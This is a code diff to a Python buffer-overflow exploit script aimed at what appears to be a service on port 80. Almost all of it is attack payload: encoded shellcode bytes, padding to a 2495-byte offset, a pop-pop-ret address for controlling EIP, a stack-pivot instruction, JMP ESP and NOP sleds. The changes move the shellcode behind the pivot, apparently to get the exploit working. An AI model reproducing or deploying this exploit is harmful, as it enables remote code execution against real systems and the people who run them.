@@ -7,7 +7,7 @@ port = 80
 # bad characters are 0x09 0x0a 0x0d 0x20
 # shellcode start 0202be8d
 def send_exploit_request():
-    shellcode =  b"\x90\x90\x90\x90\x90\x90"
+    shellcode =  b""
     shellcode += b"\xba\xa8\xa8\x2a\x9e\xd9\xc4\xd9\x74\x24\xf4"
     shellcode += b"\x58\x29\xc9\xb1\x59\x31\x50\x14\x03\x50\x14"
     shellcode += b"\x83\xe8\xfc\x4a\x5d\xd6\x76\x05\x9e\x27\x87"
@@ -43,15 +43,17 @@ def send_exploit_request():
     shellcode += b"\xcd\xd7\xfe\xbb\xf2\x18\xff\xd5\x96\x19\xff"
     shellcode += b"\xd9\xa8\x26\x29\xe0\xde\x69\xe9\x57\xd0\xdc"
     shellcode += b"\x4c\xf1\x7b\x1e\xc2\x01\xae"
-    offset = shellcode
+    offset = ""
     offset  += b"A" * (2495 -len(offset))
     offset += b"\x90\xeb\x05\x90"
     offset += b"\xc0\x76\x15\x10" # Controlling EIP
-    # JMP ESP, 0x5d7 - 6681C4D705
+    # JMP ESP, 0x5d7 - 6681C45A36
     # PPR 0x101576c0
     # short jump eb06
-    offset += b"\x66\x81\xC4\xD7\x05"
+    offset += b"\x66\x81\xC4\x5A\x36"
     offset += b"\xFF\xE4"
+    offset += b"\x90" * 600
+    offset += shellcode
     offset += b"D" * (6000 - len(offset))
     offset += b"\x90" * 6
     offset += b"E" * 400
